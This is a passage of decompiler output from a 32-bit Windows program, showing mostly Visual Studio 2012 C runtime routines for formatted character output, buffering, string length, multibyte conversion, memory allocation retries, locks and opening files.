              local_24c = 1;
            }
            pbVar11 = local_238;
            if (local_254 != (int *)0x0) {
              FID_conflict__free(local_254);
              local_254 = (int *)0x0;
              pbVar11 = local_238;
            }
            break;
          default:
            goto switchD_0040db3c_caseD_9;
          case 0xbad1abe1:
            break;
          }
          local_211 = *pbVar11;
          local_250 = CONCAT31(local_250._1_3_,local_211);
          pbVar10 = pbVar11;
        } while (local_211 != 0);
        if ((local_240 == 0) || (local_240 == 7)) goto LAB_0040e4cc;
      }
    }
  }
switchD_0040db3c_caseD_9:
  piVar12 = __errno();
  *piVar12 = 0x16;
  FUN_00407ceb();
LAB_0040e4cc:
  if (local_270 != '\0') {
    *(uint *)(local_274 + 0x70) = *(uint *)(local_274 + 0x70) & 0xfffffffd;
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  _write_char
// 
// Library: Visual Studio 2012 Release

void __cdecl _write_char(byte param_1,FILE *param_2,int *param_3)

{
  int *piVar1;
  uint uVar2;
  
  if (((*(byte *)&param_2->_flag & 0x40) == 0) || (param_2->_base != (char *)0x0)) {
    piVar1 = &param_2->_cnt;
    *piVar1 = *piVar1 + -1;
    if (*piVar1 < 0) {
      uVar2 = FUN_00407dae(param_1,param_2);
    }
    else {
      *param_2->_ptr = param_1;
      param_2->_ptr = param_2->_ptr + 1;
      uVar2 = (uint)param_1;
    }
    if (uVar2 == 0xffffffff) {
      *param_3 = -1;
      return;
    }
  }
  *param_3 = *param_3 + 1;
  return;
}



// Library Function - Single Match
//  _write_multi_char
// 
// Library: Visual Studio 2012 Release

void __cdecl _write_multi_char(byte param_1,int param_2,FILE *param_3,int *param_4)

{
  if (0 < param_2) {
    do {
      param_2 = param_2 + -1;
      _write_char(param_1,param_3,param_4);
      if (*param_4 == -1) {
        return;
      }
    } while (0 < param_2);
  }
  return;
}



// Library Function - Single Match
//  _write_string
// 
// Library: Visual Studio 2012 Release

void __cdecl _write_string(byte *param_1,int param_2,FILE *param_3,int *param_4,int *param_5)

{
  int iVar1;
  
  iVar1 = *param_5;
  if (((*(byte *)&param_3->_flag & 0x40) == 0) || (param_3->_base != (char *)0x0)) {
    *param_5 = 0;
    if (0 < param_2) {
      do {
        param_2 = param_2 + -1;
        _write_char(*param_1,param_3,param_4);
        param_1 = param_1 + 1;
        if (*param_4 == -1) {
          if (*param_5 != 0x2a) break;
          _write_char(0x3f,param_3,param_4);
        }
      } while (0 < param_2);
      if (*param_5 != 0) {
        return;
      }
    }
    *param_5 = iVar1;
  }
  else {
    *param_4 = *param_4 + param_2;
  }
  return;
}



byte __cdecl FUN_0040e5f9(uint param_1)

{
  int *piVar1;
  
  if (param_1 == 0xfffffffe) {
    piVar1 = __errno();
    *piVar1 = 9;
  }
  else {
    if ((-1 < (int)param_1) && (param_1 < DAT_0041cf60)) {
      return *(byte *)((&DAT_0041b8c0)[(int)param_1 >> 5] + 4 + (param_1 & 0x1f) * 0x40) & 0x40;
    }
    piVar1 = __errno();
    *piVar1 = 9;
    FUN_00407ceb();
  }
  return 0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __getbuf
// 
// Library: Visual Studio 2012 Release

void __cdecl __getbuf(FILE *_File)

{
  char *pcVar1;
  
  _DAT_0041b24c = _DAT_0041b24c + 1;
  pcVar1 = (char *)__malloc_crt(0x1000);
  _File->_base = pcVar1;
  if (pcVar1 == (char *)0x0) {
    _File->_flag = _File->_flag | 4;
    _File->_base = (char *)&_File->_charbuf;
    _File->_bufsiz = 2;
  }
  else {
    _File->_flag = _File->_flag | 8;
    _File->_bufsiz = 0x1000;
  }
  _File->_cnt = 0;
  _File->_ptr = _File->_base;
  return;
}



// Library Function - Single Match
//  __isleadbyte_l
// 
// Library: Visual Studio 2012 Release

int __cdecl __isleadbyte_l(int _C,_locale_t _Locale)

{
  ushort uVar1;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
  uVar1 = *(ushort *)(*(int *)(local_14[0] + 0x90) + (_C & 0xffU) * 2);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return uVar1 & 0x8000;
}



// Library Function - Single Match
//  _isleadbyte
// 
// Library: Visual Studio 2012 Release

int __cdecl _isleadbyte(int _C)

{
  int iVar1;
  
  iVar1 = __isleadbyte_l(_C,(_locale_t)0x0);
  return iVar1;
}



// Library Function - Single Match
//  _strlen
// 
// Library: Visual Studio

size_t __cdecl _strlen(char *_Str)

{
  char cVar1;
  uint uVar2;
  uint *puVar3;
  uint *puVar4;
  
  uVar2 = (uint)_Str & 3;
  puVar3 = (uint *)_Str;
  while (uVar2 != 0) {
    cVar1 = *(char *)puVar3;
    puVar3 = (uint *)((int)puVar3 + 1);
    if (cVar1 == '\0') goto LAB_0040e743;
    uVar2 = (uint)puVar3 & 3;
  }
  do {
    do {
      puVar4 = puVar3;
      puVar3 = puVar4 + 1;
    } while (((*puVar4 ^ 0xffffffff ^ *puVar4 + 0x7efefeff) & 0x81010100) == 0);
    uVar2 = *puVar4;
    if ((char)uVar2 == '\0') {
      return (int)puVar4 - (int)_Str;
    }
    if ((char)(uVar2 >> 8) == '\0') {
      return (size_t)((int)puVar4 + (1 - (int)_Str));
    }
    if ((uVar2 & 0xff0000) == 0) {
      return (size_t)((int)puVar4 + (2 - (int)_Str));
    }
  } while ((uVar2 & 0xff000000) != 0);
LAB_0040e743:
  return (size_t)((int)puVar3 + (-1 - (int)_Str));
}



bool FUN_0040e76b(void)

{
  return DAT_0041bc00 == (DAT_0041a038 | 1);
}



// Library Function - Single Match
//  __fputwc_nolock
// 
// Library: Visual Studio 2012 Release

wint_t __cdecl __fputwc_nolock(wchar_t _Ch,FILE *_File)

{
  int *piVar1;
  wint_t wVar2;
  int iVar3;
  uint uVar4;
  undefined *puVar5;
  errno_t eVar6;
  undefined *puVar7;
  int local_14;
  byte local_10 [8];
  uint local_8;
  
  local_8 = DAT_0041a038 ^ (uint)&stack0xfffffffc;
  if ((*(byte *)&_File->_flag & 0x40) == 0) {
    iVar3 = __fileno(_File);
    puVar7 = &DAT_0041a548;
    if ((iVar3 == -1) || (iVar3 = __fileno(_File), iVar3 == -2)) {
      puVar5 = &DAT_0041a548;
    }
    else {
      iVar3 = __fileno(_File);
      uVar4 = __fileno(_File);
      puVar5 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_0041b8c0)[iVar3 >> 5]);
    }
    if ((puVar5[0x24] & 0x7f) != 2) {
      iVar3 = __fileno(_File);
      if ((iVar3 == -1) || (iVar3 = __fileno(_File), iVar3 == -2)) {
        puVar5 = &DAT_0041a548;
      }
      else {
        iVar3 = __fileno(_File);
        uVar4 = __fileno(_File);
        puVar5 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_0041b8c0)[iVar3 >> 5]);
      }
      if ((puVar5[0x24] & 0x7f) != 1) {
        iVar3 = __fileno(_File);
        if ((iVar3 != -1) && (iVar3 = __fileno(_File), iVar3 != -2)) {
          iVar3 = __fileno(_File);
          uVar4 = __fileno(_File);
          puVar7 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_0041b8c0)[iVar3 >> 5]);
        }
        if ((puVar7[4] & 0x80) != 0) {
          eVar6 = _wctomb_s(&local_14,(char *)local_10,5,_Ch);
          if ((eVar6 == 0) && (iVar3 = 0, 0 < local_14)) {
            do {
              piVar1 = &_File->_cnt;
              *piVar1 = *piVar1 + -1;
              if (*piVar1 < 0) {
                uVar4 = FUN_00407dae(local_10[iVar3],_File);
              }
              else {
                *_File->_ptr = local_10[iVar3];
                uVar4 = (uint)(byte)*_File->_ptr;
                _File->_ptr = _File->_ptr + 1;
              }
            } while ((uVar4 != 0xffffffff) && (iVar3 = iVar3 + 1, iVar3 < local_14));
          }
          goto LAB_0040e8f6;
        }
      }
    }
  }
  piVar1 = &_File->_cnt;
  *piVar1 = *piVar1 + -2;
  if (*piVar1 < 0) {
    FUN_00412e0b(_Ch,_File);
  }
  else {
    *(wchar_t *)_File->_ptr = _Ch;
    _File->_ptr = _File->_ptr + 2;
  }
LAB_0040e8f6:
  wVar2 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return wVar2;
}



// Library Function - Single Match
//  __mbtowc_l
// 
// Library: Visual Studio 2012 Release

int __cdecl __mbtowc_l(wchar_t *_DstCh,char *_SrcCh,size_t _SrcSizeInBytes,_locale_t _Locale)

{
  uint uVar1;
  int iVar2;
  int *piVar3;
  int iVar4;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  if ((_SrcCh == (char *)0x0) || (_SrcSizeInBytes == 0)) {
    return 0;
  }
  if (*_SrcCh == '\0') {
    if (_DstCh == (wchar_t *)0x0) {
      return 0;
    }
    *_DstCh = L'\0';
    return 0;
  }
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
  if ((local_14.locinfo)->locale_name[2] == (wchar_t *)0x0) {
    if (_DstCh != (wchar_t *)0x0) {
      *_DstCh = (ushort)(byte)*_SrcCh;
    }
    iVar4 = 1;
    goto LAB_0040e9e3;
  }
  iVar4 = __isleadbyte_l((uint)(byte)*_SrcCh,&local_14);
  if (iVar4 == 0) {
    iVar4 = 1;
    iVar2 = MultiByteToWideChar((local_14.locinfo)->lc_codepage,9,_SrcCh,1,_DstCh,
                                (uint)(_DstCh != (wchar_t *)0x0));
    if (iVar2 != 0) goto LAB_0040e9e3;
LAB_0040e9d5:
    piVar3 = __errno();
    iVar4 = -1;
    *piVar3 = 0x2a;
  }
  else {
    if ((local_14.locinfo)->mb_cur_max < 2) {
LAB_0040e9a2:
      uVar1 = (local_14.locinfo)->mb_cur_max;
LAB_0040e9a5:
      if ((_SrcSizeInBytes < uVar1) || (_SrcCh[1] == '\0')) goto LAB_0040e9d5;
    }
    else {
      uVar1 = (local_14.locinfo)->mb_cur_max;
      if ((int)_SrcSizeInBytes < (int)uVar1) goto LAB_0040e9a5;
      iVar4 = MultiByteToWideChar((local_14.locinfo)->lc_codepage,9,_SrcCh,
                                  (local_14.locinfo)->mb_cur_max,_DstCh,
                                  (uint)(_DstCh != (wchar_t *)0x0));
      if (iVar4 == 0) goto LAB_0040e9a2;
    }
    iVar4 = (local_14.locinfo)->mb_cur_max;
  }
LAB_0040e9e3:
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    return iVar4;
  }
  return iVar4;
}



// Library Function - Single Match
//  _mbtowc
// 
// Library: Visual Studio 2012 Release

int __cdecl _mbtowc(wchar_t *_DstCh,char *_SrcCh,size_t _SrcSizeInBytes)

{
  int iVar1;
  
  iVar1 = __mbtowc_l(_DstCh,_SrcCh,_SrcSizeInBytes,(_locale_t)0x0);
  return iVar1;
}



// Library Function - Single Match
//  __calloc_crt
// 
// Library: Visual Studio 2012 Release

void * __cdecl __calloc_crt(size_t _Count,size_t _Size)

{
  LPVOID pvVar1;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  while( true ) {
    pvVar1 = __calloc_impl(_Count,_Size,(int *)0x0);
    if (pvVar1 != (LPVOID)0x0) {
      return pvVar1;
    }
    if (DAT_0041bc04 == 0) break;
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (DAT_0041bc04 < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
    if (dwMilliseconds == 0xffffffff) {
      return (void *)0x0;
    }
  }
  return (void *)0x0;
}



// Library Function - Single Match
//  __malloc_crt
// 
// Library: Visual Studio 2012 Release

void * __cdecl __malloc_crt(size_t _Size)

{
  uint uVar1;
  void *pvVar2;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  while( true ) {
    uVar1 = DAT_0041bc04;
    pvVar2 = _malloc(_Size);
    if (pvVar2 != (void *)0x0) {
      return pvVar2;
    }
    if (uVar1 == 0) break;
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (DAT_0041bc04 < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
    if (dwMilliseconds == 0xffffffff) {
      return (void *)0x0;
    }
  }
  return (void *)0x0;
}



// Library Function - Single Match
//  __realloc_crt
// 
// Library: Visual Studio 2012 Release

void * __cdecl __realloc_crt(void *_Ptr,size_t _NewSize)

{
  void *pvVar1;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  do {
    pvVar1 = _realloc(_Ptr,_NewSize);
    if (pvVar1 != (void *)0x0) {
      return pvVar1;
    }
    if (_NewSize == 0) {
      return (void *)0x0;
    }
    if (DAT_0041bc04 == 0) {
      return (void *)0x0;
    }
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (DAT_0041bc04 < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
  } while (dwMilliseconds != 0xffffffff);
  return (void *)0x0;
}



// Library Function - Single Match
//  __initp_misc_cfltcvt_tab
// 
// Library: Visual Studio 2012 Release

void __initp_misc_cfltcvt_tab(void)

{
  PVOID pvVar1;
  uint uVar2;
  
  uVar2 = 0;
  do {
    pvVar1 = EncodePointer(*(PVOID *)((int)&PTR_LAB_0041ad20 + uVar2));
    *(PVOID *)((int)&PTR_LAB_0041ad20 + uVar2) = pvVar1;
    uVar2 = uVar2 + 4;
  } while (uVar2 < 0x28);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

int FUN_0040eb0e(void)

{
  FILE *_File;
  int iVar1;
  int iVar2;
  int iVar3;
  
  iVar3 = 0;
  __lock(1);
  for (iVar2 = 3; iVar2 < DAT_0041cf84; iVar2 = iVar2 + 1) {
    _File = *(FILE **)(DAT_0041cf80 + iVar2 * 4);
    if (_File != (FILE *)0x0) {
      if ((*(byte *)&_File->_flag & 0x83) != 0) {
        iVar1 = _fclose(_File);
        if (iVar1 != -1) {
          iVar3 = iVar3 + 1;
        }
      }
      if (0x13 < iVar2) {
        DeleteCriticalSection((LPCRITICAL_SECTION)(*(int *)(DAT_0041cf80 + iVar2 * 4) + 0x20));
        FID_conflict__free(*(void **)(DAT_0041cf80 + iVar2 * 4));
        *(undefined4 *)(DAT_0041cf80 + iVar2 * 4) = 0;
      }
    }
  }
  FUN_0040eba2();
  return iVar3;
}



void FUN_0040eba2(void)

{
  FUN_0040ed0f(1);
  return;
}



// Library Function - Single Match
//  __lock
// 
// Library: Visual Studio 2012 Release

void __cdecl __lock(int _File)

{
  int iVar1;
  
  if ((&DAT_0041ad48)[_File * 2] == 0) {
    iVar1 = __mtinitlocknum(_File);
    if (iVar1 == 0) {
      __amsg_exit(0x11);
    }
  }
  EnterCriticalSection((LPCRITICAL_SECTION)(&DAT_0041ad48)[_File * 2]);
  return;
}



// Library Function - Single Match
//  __mtdeletelocks
// 
// Library: Visual Studio 2012 Release

void __cdecl __mtdeletelocks(void)

{
  LPCRITICAL_SECTION lpCriticalSection;
  LPCRITICAL_SECTION *pp_Var1;
  LPCRITICAL_SECTION *pp_Var2;
  
  pp_Var1 = (LPCRITICAL_SECTION *)&DAT_0041ad48;
  pp_Var2 = (LPCRITICAL_SECTION *)&DAT_0041ad48;
  do {
    lpCriticalSection = *pp_Var2;
    if ((lpCriticalSection != (LPCRITICAL_SECTION)0x0) && (pp_Var2[1] != (LPCRITICAL_SECTION)0x1)) {
      DeleteCriticalSection(lpCriticalSection);
      FID_conflict__free(lpCriticalSection);
      *pp_Var2 = (LPCRITICAL_SECTION)0x0;
    }
    pp_Var2 = pp_Var2 + 2;
  } while ((int)pp_Var2 < 0x41ae68);
  do {
    if ((*pp_Var1 != (LPCRITICAL_SECTION)0x0) && (pp_Var1[1] == (LPCRITICAL_SECTION)0x1)) {
      DeleteCriticalSection(*pp_Var1);
    }
    pp_Var1 = pp_Var1 + 2;
  } while ((int)pp_Var1 < 0x41ae68);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __mtinitlocknum
// 
// Library: Visual Studio 2012 Release

int __cdecl __mtinitlocknum(int _LockNum)

{
  LPCRITICAL_SECTION lpCriticalSection;
  int *piVar1;
  
  if (DAT_0041b8b8 == 0) {
    __FF_MSGBANNER();
    __NMSG_WRITE(0x1e);
    ___crtExitProcess(0xff);
  }
  if ((&DAT_0041ad48)[_LockNum * 2] == 0) {
    lpCriticalSection = (LPCRITICAL_SECTION)__malloc_crt(0x18);
    if (lpCriticalSection == (LPCRITICAL_SECTION)0x0) {
      piVar1 = __errno();
      *piVar1 = 0xc;
      return 0;
    }
    __lock(10);
    if ((&DAT_0041ad48)[_LockNum * 2] == 0) {
      InitializeCriticalSectionAndSpinCount(lpCriticalSection,4000);
      (&DAT_0041ad48)[_LockNum * 2] = lpCriticalSection;
    }
    else {
      FID_conflict__free(lpCriticalSection);
    }
    FUN_0040ecd1();
  }
  return 1;
}



void FUN_0040ecd1(void)

{
  FUN_0040ed0f(10);
  return;
}



// Library Function - Single Match
//  __mtinitlocks
// 
// Library: Visual Studio 2012 Release

int __cdecl __mtinitlocks(void)

{
  LPCRITICAL_SECTION *pp_Var1;
  LPCRITICAL_SECTION p_Var2;
  
  pp_Var1 = (LPCRITICAL_SECTION *)&DAT_0041ad48;
  p_Var2 = (LPCRITICAL_SECTION)&DAT_0041bc08;
  do {
    if (pp_Var1[1] == (LPCRITICAL_SECTION)0x1) {
      *pp_Var1 = p_Var2;
      p_Var2 = p_Var2 + 1;
      InitializeCriticalSectionAndSpinCount(*pp_Var1,4000);
    }
    pp_Var1 = pp_Var1 + 2;
  } while ((int)pp_Var1 < 0x41ae68);
  return 1;
}



void __cdecl FUN_0040ed0f(int param_1)

{
  LeaveCriticalSection((LPCRITICAL_SECTION)(&DAT_0041ad48)[param_1 * 2]);
  return;
}



// Library Function - Single Match
//  ___createFile
// 
// Library: Visual Studio 2012 Release

HANDLE __cdecl
___createFile(LPCWSTR param_1,DWORD param_2,DWORD param_3,LPSECURITY_ATTRIBUTES param_4,
             DWORD param_5,uint param_6,uint param_7)

{
  bool bVar1;
  undefined3 extraout_var;
  HMODULE hModule;
  FARPROC pFVar2;
  undefined3 extraout_var_00;
  HANDLE pvVar3;
  char *lpProcName;
  undefined4 local_20;
  uint local_1c;
  uint local_18;
  undefined4 local_14;
  LPSECURITY_ATTRIBUTES local_10;
  undefined4 local_c;
  FARPROC local_8;
  
  bVar1 = FUN_004078da();
  pFVar2 = local_8;
  if (CONCAT31(extraout_var,bVar1) != 0) {
    lpProcName = s_CreateFile2_004155b4;
    hModule = GetModuleHandleW(u_kernel32_dll_0041427c);
    pFVar2 = GetProcAddress(hModule,lpProcName);
    if (pFVar2 == (FARPROC)0x0) {
      return (HANDLE)0xffffffff;
    }
  }
  bVar1 = FUN_004078da();
  if (CONCAT31(extraout_var_00,bVar1) == 0) {
    pvVar3 = CreateFileW(param_1,param_2,param_3,param_4,param_5,param_6 | param_7,(HANDLE)0x0);
  }
  else {
    local_14 = 0;
    local_c = 0;
    local_1c = param_6;
    local_18 = param_7;
    local_10 = param_4;
    local_20 = 0x18;
    pvVar3 = (HANDLE)(*pFVar2)(param_1,param_2,param_3,param_5,&local_20);
  }
  return pvVar3;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Multiple Matches With Different Base Names
//  __sopen_helper
//  __wsopen_helper
// 
// Library: Visual Studio 2012 Release

errno_t __cdecl
FID_conflict___sopen_helper
          (char *_Filename,int _OFlag,int _ShFlag,int _PMode,int *_PFileHandle,int _BSecure)

{
  int *piVar1;
  errno_t eVar2;
  undefined4 local_20 [5];
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_004190a8;
  uStack_c = 0x40edc1;
  local_20[0] = 0;
  if (((_PFileHandle == (int *)0x0) || (*_PFileHandle = -1, _Filename == (char *)0x0)) ||
     ((_BSecure != 0 && ((_PMode & 0xfffffe7fU) != 0)))) {
    piVar1 = __errno();
    eVar2 = 0x16;
    *piVar1 = 0x16;
    FUN_00407ceb();
  }
  else {
    local_8 = (undefined *)0x0;
    eVar2 = FUN_0040ee7c(local_20,(WCHAR **)_PFileHandle,(LPCWSTR)_Filename,_OFlag,_ShFlag,
                         (byte)_PMode);
    local_8 = (undefined *)0xfffffffe;
    FUN_0040ee50();
    if (eVar2 != 0) {
      *_PFileHandle = -1;
    }
  }
  return eVar2;
}



void FUN_0040ee50(void)

{
  byte *pbVar1;
  int unaff_EBP;
  uint *unaff_ESI;
  int unaff_EDI;
  
  if (*(int *)(unaff_EBP + -0x1c) != 0) {
    if (unaff_EDI != 0) {
      pbVar1 = (byte *)((&DAT_0041b8c0)[(int)*unaff_ESI >> 5] + 4 + (*unaff_ESI & 0x1f) * 0x40);
      *pbVar1 = *pbVar1 & 0xfe;
    }
    __unlock_fhandle(*unaff_ESI);
  }
  return;
}



int __cdecl
FUN_0040ee7c(undefined4 *param_1,WCHAR **param_2,LPCWSTR param_3,uint param_4,int param_5,
            byte param_6)

{
  byte *pbVar1;
  int iVar2;
  uint uVar3;
  ulong *puVar4;
  int *piVar5;
  uint uVar6;
  uint uVar7;
  WCHAR *pWVar8;
  DWORD DVar9;
  int iVar10;
  HANDLE pvVar11;
  byte bVar12;
  int unaff_ESI;
  bool bVar13;
  longlong lVar14;
  _SECURITY_ATTRIBUTES local_3c;
  undefined4 local_30;
  int local_2c;
  undefined4 local_28;
  uint local_24;
  HANDLE local_20;
  uint local_1c;
  uint local_18;
  uint local_14;
  uint local_10;
  uint local_c;
  byte local_7;
  byte local_6;
  byte local_5;
  
  bVar13 = (param_4 & 0x80) == 0;
  local_24 = 0;
  local_6 = 0;
  local_3c.nLength = 0xc;
  local_3c.lpSecurityDescriptor = (LPVOID)0x0;
  if (bVar13) {
    local_5 = 0;
  }
  else {
    local_5 = 0x10;
  }
  local_3c.bInheritHandle = (BOOL)bVar13;
  iVar2 = FUN_0041324d(&local_24);
  if (iVar2 != 0) {
                    // WARNING: Subroutine does not return
    __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  if (((param_4 & 0x8000) == 0) && (((param_4 & 0x74000) != 0 || (local_24 != 0x8000)))) {
    local_5 = local_5 | 0x80;
  }
  uVar3 = param_4 & 3;
  if (uVar3 == 0) {
    local_c = 0x80000000;
  }
  else if (uVar3 == 1) {
    if (((param_4 & 8) == 0) || ((param_4 & 0x70000) == 0)) {
      local_c = 0x40000000;
    }
    else {
      local_c = 0xc0000000;
    }
  }
  else {
    if (uVar3 != 2) {
      puVar4 = ___doserrno();
      *puVar4 = 0;
      *param_2 = (WCHAR *)0xffffffff;
      piVar5 = __errno();
      *piVar5 = 0x16;
      FUN_00407ceb();
      return 0x16;
    }
    local_c = 0xc0000000;
  }
  uVar3 = 2;
  local_2c = 2;
  if (param_5 == 0x10) {
    local_10 = 0;
  }
  else if (param_5 == 0x20) {
    local_10 = 1;
  }
  else if (param_5 == 0x30) {
    local_10 = 2;
  }
  else if (param_5 == 0x40) {
    local_10 = 3;
  }
  else {
    if (param_5 != 0x80) goto LAB_0040efd3;
    local_10 = (uint)(local_c == 0x80000000);
  }
  uVar6 = param_4 & 0x700;
  if (uVar6 < 0x401) {
    if ((uVar6 == 0x400) || (uVar6 == 0)) {
      uVar3 = 3;
    }
    else if (uVar6 == 0x100) {
      uVar3 = 4;
    }
    else {
      if (uVar6 == 0x200) goto LAB_0040eff4;
      if (uVar6 != 0x300) goto LAB_0040efd3;
    }
  }
  else {
    if (uVar6 != 0x500) {
      if (uVar6 == 0x600) {
LAB_0040eff4:
        uVar3 = 5;
        goto LAB_0040effb;
      }
      if (uVar6 != 0x700) {
LAB_0040efd3:
        puVar4 = ___doserrno();
        *puVar4 = 0;
        *param_2 = (WCHAR *)0xffffffff;
        piVar5 = __errno();
        *piVar5 = 0x16;
        FUN_00407ceb();
        return 0x16;
      }
    }
    uVar3 = 1;
  }
LAB_0040effb:
  uVar6 = 0x80;
  local_1c = 0x80;
  local_14 = 0;
  if (((param_4 & 0x100) != 0) && (-1 < (char)(~(byte)DAT_0041b250 & param_6))) {
    uVar6 = 1;
    local_1c = 1;
  }
  uVar7 = 0;
  if ((param_4 & 0x40) != 0) {
    local_c = local_c | 0x10000;
    local_10 = local_10 | 4;
    uVar7 = 0x4000000;
    local_14 = 0x4000000;
  }
  if ((param_4 & 0x1000) != 0) {
    local_1c = uVar6 | 0x100;
  }
  if ((param_4 & 0x2000) != 0) {
    uVar7 = uVar7 | 0x2000000;
    local_14 = uVar7;
  }
  if ((param_4 & 0x20) == 0) {
    if ((param_4 & 0x10) != 0) {
      local_14 = uVar7 | 0x10000000;
    }
  }
  else {
    local_14 = uVar7 | 0x8000000;
  }
  pWVar8 = (WCHAR *)FUN_0040fbab();
  *param_2 = pWVar8;
  if (pWVar8 == (WCHAR *)0xffffffff) {
    puVar4 = ___doserrno();
    *puVar4 = 0;
    *param_2 = (WCHAR *)0xffffffff;
    piVar5 = __errno();
    *piVar5 = 0x18;
    piVar5 = __errno();
    return *piVar5;
  }
  *param_1 = 1;
  local_20 = ___createFile(param_3,local_c,local_10,&local_3c,uVar3,local_1c,local_14);
  if (local_20 == (HANDLE)0xffffffff) {
    if (((local_c & 0xc0000000) == 0xc0000000) && ((param_4 & 1) != 0)) {
      local_c = local_c & 0x7fffffff;
      local_20 = ___createFile(param_3,local_c,local_10,&local_3c,uVar3,local_1c,local_14);
      if (local_20 != (HANDLE)0xffffffff) goto LAB_0040f14a;
    }
    pbVar1 = (byte *)((&DAT_0041b8c0)[(int)*param_2 >> 5] + 4 + ((uint)*param_2 & 0x1f) * 0x40);
    *pbVar1 = *pbVar1 & 0xfe;
    DVar9 = GetLastError();
    FID_conflict___dosmaperr(DVar9);
    goto LAB_0040f13e;
  }
LAB_0040f14a:
  DVar9 = GetFileType(local_20);
  if (DVar9 == 0) {
    pbVar1 = (byte *)((&DAT_0041b8c0)[(int)*param_2 >> 5] + 4 + ((uint)*param_2 & 0x1f) * 0x40);
    *pbVar1 = *pbVar1 & 0xfe;
    DVar9 = GetLastError();
    FID_conflict___dosmaperr(DVar9);
    CloseHandle(local_20);
    if (DVar9 == 0) {
      piVar5 = __errno();
      *piVar5 = 0xd;
    }
    goto LAB_0040f13e;
  }
  if (DVar9 == 2) {
    local_5 = local_5 | 0x40;
  }
  else if (DVar9 == 3) {
    local_5 = local_5 | 8;
  }
  __set_osfhnd((int)*param_2,(intptr_t)local_20);
  bVar12 = local_5 | 1;
  *(byte *)((&DAT_0041b8c0)[(int)*param_2 >> 5] + 4 + ((uint)*param_2 & 0x1f) * 0x40) = bVar12;
  pbVar1 = (byte *)((&DAT_0041b8c0)[(int)*param_2 >> 5] + 0x24 + ((uint)*param_2 & 0x1f) * 0x40);
  *pbVar1 = *pbVar1 & 0x80;
  local_7 = local_5 & 0x48;
  local_5 = bVar12;
  if (local_7 == 0) {
    if (-1 < (char)bVar12) goto LAB_0040f4bb;
    if ((param_4 & 2) == 0) goto LAB_0040f297;
    lVar14 = __lseeki64_nolock((int)*param_2,0x2ffffffff,unaff_ESI);
    local_18 = (uint)((ulonglong)lVar14 >> 0x20);
    local_30 = (undefined4)lVar14;
    if (lVar14 == -1) {
      puVar4 = ___doserrno();
      if (*puVar4 == 0x83) goto LAB_0040f297;
    }
    else {
      local_28 = 0;
      uVar6 = FUN_00409798((uint)*param_2,(LPWSTR)&local_28,1);
      if ((((uVar6 != 0) || ((short)local_28 != 0x1a)) ||
          (iVar2 = __chsize_nolock((int)*param_2,CONCAT44(unaff_ESI,local_18)), iVar2 != -1)) &&
         (lVar14 = __lseeki64_nolock((int)*param_2,0,unaff_ESI), lVar14 != -1)) goto LAB_0040f297;
    }
LAB_0040f23e:
    FUN_00409ff1((uint)*param_2);
  }
  else {
LAB_0040f297:
    if ((char)local_5 < '\0') {
      if ((param_4 & 0x74000) == 0) {
        if ((local_24 & 0x74000) == 0) {
          param_4 = param_4 | 0x4000;
        }
        else {
          param_4 = param_4 | local_24 & 0x74000;
        }
      }
      uVar6 = param_4 & 0x74000;
      if (uVar6 == 0x4000) {
        local_6 = 0;
      }
      else if ((uVar6 == 0x10000) || (uVar6 == 0x14000)) {
        if ((param_4 & 0x301) == 0x301) goto LAB_0040f30a;
      }
      else if ((uVar6 == 0x20000) || (uVar6 == 0x24000)) {
LAB_0040f30a:
        local_6 = 2;
      }
      else if ((uVar6 == 0x40000) || (uVar6 == 0x44000)) {
        local_6 = 1;
      }
      if (((param_4 & 0x70000) != 0) && (local_18 = 0, (local_5 & 0x40) == 0)) {
        uVar6 = local_c & 0xc0000000;
        if (uVar6 == 0x40000000) {
          if (uVar3 != 0) {
            if (2 < uVar3) {
              if (uVar3 < 5) {
                lVar14 = __lseeki64_nolock((int)*param_2,0x200000000,unaff_ESI);
                if (lVar14 != 0) goto LAB_0040f456;
              }
              else {
LAB_0040f367:
                if (uVar3 != 5) goto LAB_0040f4bb;
              }
            }
LAB_0040f472:
            iVar2 = 0;
            if (local_6 == 1) {
              iVar10 = 3;
              local_18 = 0xbfbbef;
              local_2c = 3;
            }
            else {
              if (local_6 != 2) goto LAB_0040f4bb;
              local_18 = 0xfeff;
              iVar10 = 2;
            }
            do {
              iVar10 = FUN_0040a8a4(*param_2,(WCHAR *)((int)&local_18 + iVar2),
                                    (WCHAR *)(iVar10 - iVar2));
              if (iVar10 == -1) goto LAB_0040f23e;
